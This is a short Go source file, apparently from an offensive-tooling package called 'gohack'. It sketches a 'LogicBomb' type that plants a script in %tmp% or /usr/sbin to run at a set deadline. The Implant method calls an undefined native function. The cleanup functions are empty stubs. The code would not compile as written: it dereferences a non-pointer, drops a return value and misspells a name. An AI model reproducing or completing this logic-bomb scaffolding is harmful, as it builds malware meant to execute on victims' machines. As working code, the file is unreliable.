package gohack

import "C"
import (
	"crypto/rand"
	"encoding/hex"
	"time"
)

const (
	WindowsLocate string = `%tmp%`
	UnixLoacte    string = "/usr/sbin"
)

// LogicBomb ...
/*
A simple struct for logicbomb executed at time: Deadline.
A script: Script must be supplied
*/
type LogicBomb struct {
	BombID   string
	Deadline *time.Time
	Location string
	Script   [3]string // Mapping: [3]string{String-content, extension/type, commandline-execution-template}
}

func (lb *LogicBomb) Implant(location string, deadline time.Time, script [3]string) {
	lb.BombID = randomHex(32)
	lb.Location = location
	lb.Deadline = *deadline
	lb.Script = script

	C.implant_bomb()
}

func (lb *LogicBomb) Disarm() {

}

func Locate() {

}

func Remove(bombID string) int {
	return 0
}

func RemoveAll() {

}

func randomHex(n int) (string, error) {
	bytes := make([]byte, n)
	if _, err := rand.Read(bytes); err != nil {
		return "", err
	}
	return hex.EncodeToString(bytes), nil
}
